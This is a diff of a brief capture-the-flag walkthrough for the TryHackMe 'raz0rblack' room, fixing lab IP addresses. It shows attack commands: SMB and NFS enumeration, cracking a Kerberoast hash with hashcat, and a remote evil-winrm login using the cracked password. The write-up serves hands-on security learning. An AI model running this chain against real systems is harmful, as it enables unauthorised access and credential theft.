@@ -5,7 +5,7 @@ https://tryhackme.com/room/raz0rblack
 A multi-stage room, a bit hard.
 
 01. Enum showed standard windows ports, and a domain (raz0rblack.thm) 
-02. i used to enumerate the domain: root@kali$crackmapexec smb 10.10.209.59
+02. i used to enumerate the domain: root@kali$crackmapexec smb 10.10.73.116
 03. Enum NFS
     root@kali$ showmount -e 10.10.73.116
     Export list for 10.10.73.116:
@@ -74,7 +74,7 @@ A multi-stage room, a bit hard.
 
    E:\PENTEST\hashcat>hashcat32.exe -m 13100 hashes.kerberoast.txt rockyou.txt --force
    finds cracked password: password
-   root@kali$ evil-winrm -i 10.10.73.1164 -u xyan1d3 -p password
+   root@kali$ evil-winrm -i 10.10.73.116 -u xyan1d3 -p password
 13. PrivEsc
     *Evil-WinRM* PS C:\Users\xyan1d3> whoami /all
 
